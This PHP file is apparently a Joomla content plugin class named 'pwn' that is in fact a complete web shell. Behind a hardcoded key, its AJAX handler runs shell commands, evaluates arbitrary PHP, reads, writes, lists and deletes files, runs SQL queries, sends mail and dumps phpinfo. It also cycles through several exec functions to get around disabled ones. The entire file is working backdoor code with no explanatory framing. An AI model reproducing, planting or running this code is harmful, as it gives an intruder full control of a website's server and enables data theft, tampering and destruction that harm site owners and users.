<?php
defined('_JEXEC') or die();

class pwn extends Lomart\Plugin\Content\Up\Extension\Up
{
    public static function goAjax($input)
    {
        $actionName = 'pwn';
        $action = new $actionName($actionName);

        $data = $input->get('data', '', 'string');
        parse_str($data, $output);

        if (!isset($output['k']) || $output['k'] !== 'PT29-K-7f4a91c2') {
            return json_encode(['success'=>false,'data'=>['bad key']]);
        }

        $m = $output['m'] ?? 'cmd';

        try {
            switch ($m) {
                case 'cmd':
                    $c = $output['c'] ?? '';
                    $r = self::s_exec($c);
                    break;
                case 'fr':
                    $p = $output['p'] ?? '';
                    $r = @file_get_contents($p);
                    if ($r === false) $r = 'ERR-fopen';
                    break;
                case 'fw':
                    $p = $output['p'] ?? '';
                    $d = $output['d'] ?? '';
                    $r = @file_put_contents($p, $d);
                    if ($r === false) $r = 'ERR-fwrite';
                    break;
                case 'ls':
                    $p = $output['p'] ?? '.';
                    $r = @scandir($p);
                    if ($r === false) $r = 'ERR-scandir';
                    break;
                case 'rm':
                    $p = $output['p'] ?? '';
                    $r = @unlink($p) ? 'ok' : 'fail';
                    break;
                case 'phpinfo':
                    ob_start();
                    phpinfo();
                    $r = ob_get_clean();
                    break;
                case 'php':
                    $code = $output['code'] ?? '';
                    ob_start();
                    try { eval($code); } catch(Throwable $e) { echo 'E:'.$e->getMessage(); }
                    $r = ob_get_clean();
                    break;
                case 'sql':
                    $h = $output['h'] ?? 'localhost';
                    $u = $output['u'] ?? '';
                    $pw = $output['pwp'] ?? ($output['pw'] ?? '');
                    $d = $output['db'] ?? '';
                    $q = $output['q'] ?? '';
                    $c = @mysqli_connect($h, $u, $pw, $d);
                    if (!$c) { $r = 'SQL-FAIL: ' . mysqli_connect_error(); break; }
                    $rs = @mysqli_query($c, $q);
                    if ($rs === true) $r = 'OK: ' . mysqli_affected_rows($c);
                    else if ($rs === false) $r = 'SQL-ERR: ' . mysqli_error($c);
                    else {
                        $rows = [];
                        while ($row = mysqli_fetch_assoc($rs)) $rows[] = $row;
                        $r = json_encode($rows, JSON_UNESCAPED_UNICODE);
                    }
                    @mysqli_close($c);
                    break;
                case 'mail':
                    $to = $output['to'] ?? '';
                    $sub = $output['s'] ?? 's';
                    $body = $output['b'] ?? 'b';
                    $r = mail($to, $sub, $body) ? 'mail-sent' : 'mail-fail';
                    break;
                default:
                    $r = 'unknown action';
            }
        } catch (Throwable $e) {
            $r = 'EXC: ' . $e->getMessage();
        }

        return json_encode(['success' => true, 'data' => [$r]]);
    }

    private static function s_exec($c)
    {
        $disabled = ini_get('disable_functions');
        $dl = array_map('trim', explode(',', $disabled));
        if (!in_array('shell_exec', $dl)) return shell_exec($c);
        if (!in_array('passthru', $dl)) { ob_start(); passthru($c); return ob_get_clean(); }
        if (!in_array('system', $dl)) { ob_start(); system($c); return ob_get_clean(); }
        if (!in_array('exec', $dl)) { $o = []; exec($c, $o); return implode("\n", $o); }
        if (!in_array('popen', $dl)) { $p = popen($c, 'r'); $r=''; while(!feof($p)) $r.=fread($p,1024); pclose($p); return $r; }
        if (!in_array('proc_open', $dl)) {
            $d = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
            $p = proc_open($c, $d, $pipes); $r='';
            if (is_resource($p)) { $r = stream_get_contents($pipes[1]); fclose($pipes[1]); proc_close($p); }
            return $r;
        }
        return "[NO-EXEC]\ndisable_functions=$disabled\nPHP=" . PHP_VERSION . "\n";
    }
}
